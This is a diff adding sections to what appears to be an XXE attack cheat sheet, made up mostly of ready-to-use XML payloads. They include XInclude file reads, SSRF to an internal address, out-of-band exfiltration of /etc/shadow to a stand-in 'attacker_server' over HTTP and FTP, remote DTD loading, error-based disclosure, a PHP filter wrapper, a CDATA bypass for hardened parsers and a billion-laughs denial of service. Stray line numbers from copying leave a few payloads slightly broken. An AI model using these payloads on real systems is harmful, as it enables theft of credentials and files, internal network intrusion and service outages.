@@ -55,3 +55,91 @@ Embedding XXE in img
 <text font-size="16" x="0" y="16">&test;</text>
 </svg>     save as .svg and upload to server
 
+Xinlude attacks
+If in case you can control even 1 entity but not the whole document
+<example xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/hostname"/>
+</example>
+
+Launching SSRF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "http://10.0.0.1:80">
+]>
+<example>&file;</example>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "file:///etc/shadow">
+<!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">
+]>
+<example>&exfiltrate;</example>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY % file SYSTEM "file:///etc/shadow"> 1
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>"> 2
+%ent;
+%exfiltrate;
+]>
+
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
+%ent;
+%exfiltrate; then execute
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
+%xxe;
+]>
+
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
+%ent;
+%error;
+
+Performing DOS 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ELEMENT example ANY>
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<example>&lol9;</example>
+
+Bypass if XML parser is hardened
+<!ENTITY % file SYSTEM "file:///passwords.xml">
+2 <!ENTITY % start "<![CDATA[">
+3 <!ENTITY % end "]]>">
+4 <!ENTITY % ent "<!ENTITY &#x25; exfiltrate
+'http://attacker_server/?%start;%file;%end;'>">
+%ent;
+%exfiltrate;
+
+Use http://xmllint to find if your xml syntax is valid
+
+PHP url wrapper
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
+%ent;
+%exfiltrate;
+
+Exfiltrating using FTP server
+https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
+
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
+1 'ftp://attacker_server:2121/?%file;'>">
+%ent;
+%exfiltrate;
+
+
+  
